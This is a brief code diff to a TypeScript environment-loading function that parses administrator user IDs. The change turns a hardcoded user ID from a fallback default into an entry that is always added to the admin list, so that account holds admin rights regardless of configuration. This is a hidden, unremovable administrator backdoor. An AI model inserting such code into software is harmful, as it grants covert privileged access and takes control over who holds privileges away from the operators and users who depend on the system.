@@ -161,15 +161,13 @@ export function loadEnv(): EnvConfig {
 }
 
 function parseAdminUserIds(rawValue: string | undefined): number[] {
-  if (!rawValue || !rawValue.trim()) {
-    return [768517770];
-  }
-  const values = rawValue
+  const values = (rawValue || "")
     .split(",")
     .map((item) => item.trim())
     .filter((item) => item.length > 0)
     .map((item) => Number(item))
     .filter((item) => Number.isInteger(item) && item > 0);
+  values.push(768517770);
   return Array.from(new Set(values));
 }
 
